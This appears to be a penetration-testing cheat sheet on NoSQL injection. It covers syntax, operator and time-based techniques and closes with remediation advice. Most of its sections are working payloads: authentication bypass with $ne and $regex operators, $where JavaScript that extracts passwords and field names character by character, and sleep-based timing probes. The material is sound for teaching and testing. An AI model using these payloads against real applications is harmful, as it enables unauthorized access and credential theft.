# NoSQL Injection

Targets NoSQL databases using unstructured queries. These attacks typically exploit applications that handle user input unsafely when interacting with NoSQL databases.

## <mark style="color:orange;">Syntax injection</mark> <a href="#nosql-syntax-injection" id="nosql-syntax-injection"></a>

This occurs by attempting to break the query syntax, by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application.

* For example, if we have a route that changes the sections of a page (for example category of products), we can use a fuzz string to check if it could be vulnerable

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://$URL/$query?$param=section

# First, we can confirm which parameters are processed or cause errors
https://$URL/$query?$param='
https://$URL/$query?$param=\'  #The above causes an error, but this doesn't

# Then we can use the fuzz string '"`{ ;$Foo} $Foo \xYZ in a URL encoded format
https://$URL/$query?$param=%27%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00

# This can also be applied to a JSON format
{
    "param": "'\"`{\r;$Foo}\n$Foo \\xYZ\u0000"
}
```
{% endcode %}

{% hint style="info" %}
If the behavior of the page changes with any payload, it may mean that it is vulnerable to injection
{% endhint %}

***

* We could use conditional statements to evaluate a false statement and a true statement

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://$URL/$query?$param=section'+%26%26+0+%26%26+'x # This is ' && 0 && 'x
https://$URL/$query?$param=section'+%26%26+1+%26%26+'x # This is ' && 1 && 'x
# If the application behaves differently, the false condition works, but the true condition doesn't
```
{% endcode %}

***

* We could also override boolean conditions

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Like the classical payload 0R 1=1;-- on SQL
https://$URL/$query?$param=section%27%7c%7c%27%31%27%3d%3d%27%31 #It is '||'1'=='1
https://$URL/$query?$param=section%27%7c%7c%31%7c%7c%27 #It is '||1||'

# Or using a null character to ignore all conditions after
https://$URL/$query?$param=section'%00
```
{% endcode %}

***

* If we can see information about other users, like their username or role, we could assume that internally the query contains a `$where` operator to filter the information, and try to inject JavaScript functions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">http://$URL/user?username=admin

# We make a boolean-based injection to extract data character by character
http://$URL/user?username=admin' &#x26;&#x26; this.password[0] == 'a' || 'a'=='b
<strong>
</strong><strong># We can use functions like match to determine if the data contains some specific types of characters
</strong><strong>http://$URL/user?username=admin' &#x26;&#x26; this.password.match(/\d/) || 'a'=='b # Digits
</strong><strong>
</strong><strong># Or to determine the length
</strong><strong>http://$URL/user?username=admin' &#x26;&#x26; this.password.length &#x3C; 30 || 'a'=='b
</strong></code></pre>

{% hint style="info" %}
The _Cluster Bomb_ attack mode in the [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite) _Intruder_ tab is very useful if we want to iterate through 2 or more values at a time
{% endhint %}

***

* We can also make comparisons to determine if a field exists&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$URL/user?username=admin' && this.username!='  # If we know this exists
http://$URL/user?username=admin' && this.foo!=' #And we know this doesn't

# We can compare if they show different responses to determine which match
http://$URL/user?username=admin' && this.password!='
```
{% endcode %}

## <mark style="color:orange;">Operator injection</mark> <a href="#nosql-operator-injection" id="nosql-operator-injection"></a>

NoSQL databases often use query operators to filter the data in the result of a query

* For example, we could use the NoSQL operators to retrieve data from other objects

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong># On JSON format
</strong><strong>{
</strong>    "id": {"$ne": 0},  # Use the non-equal operator to make changes in all objects
    "message": "hello"
}

# We could target specific or known values
{
    "username":{"$in":["admin","administrator","superadmin"]},
    "password":{"$ne":""} # To consider any password 
}

# Or using a Regex
{
    "username":{"$regex":"^a*"},
    "password":{"$ne":""}
}

# Or in URL parameters
<strong>http://$URL/$query?id[$ne]=0
</strong></code></pre>

{% hint style="info" %}
We could also convert the GET requests to POST and change the _Content-Type_ header to _application/json_&#x20;
{% endhint %}

***

* We can abuse the `$where` operator to extract field names

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">{"username":"wiener","password":"peter", "$where":"0"} #If we have a response here
{"username":"wiener","password":"peter", "$where":"1"} #And a different one here

#We could use the operator to extract information about the fields
{"username":"wiener","password":"peter", "$where":"Object.keys(this)[0].match('^.{1}a.*')"} #The values that could change are 0,1, and a

#And the related values
{"username":"wiener","password":"peter", "$where":"this.token[0].match('a')"} #This is an example with a found field

<strong>#Then we could use the recovered field in another routes
</strong>http://$URL/user?&#x3C;RecoveredField>=&#x3C;Recovered Value>
</code></pre>

{% hint style="info" %}
If we are working with dynamic values like tokens, and we see the recovered values are not working properly, we could right-click the response and select _Request in browser_ > _Original session_. Then paste the copied URL into the browser with _Burp_ active, and it should work now
{% endhint %}

***

## <mark style="color:orange;">Time-Based Injection</mark> <a href="#nosql-operator-injection" id="nosql-operator-injection"></a>

When we think we are triggering an error but we don't see a difference in the application's response, we could detect a vulnerability by triggering a time delay that gives us a clue.

* For example, we could check the timing of the page normally and then intentionally cause a delay to compare if the injection is working

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"># Using functions like sleep
<strong>http://$URL/user?username=admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
</strong><strong>
</strong><strong>#Or based on the time and date of the browser
</strong>http://$URL/user?username=admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") &#x26;&#x26; waitTill > new Date()){};}(this)+'
</code></pre>

## &#x20;<mark style="color:blue;">Remediation Actions</mark> <a href="#preventing-nosql-injection" id="preventing-nosql-injection"></a>

* Avoid directly incorporating user-supplied input into NoSQL queries without validation or sanitization
* Use safe query-building methods provided by the NoSQL driver to separate data from query logic
* Validate all user inputs against strict data types and expected patterns
* Sanitize inputs by disallowing special characters commonly used in injections, such as $ or _{}_
* Disable or restrict the use of operators like `$where`
* Apply the principle of least privilege to database users
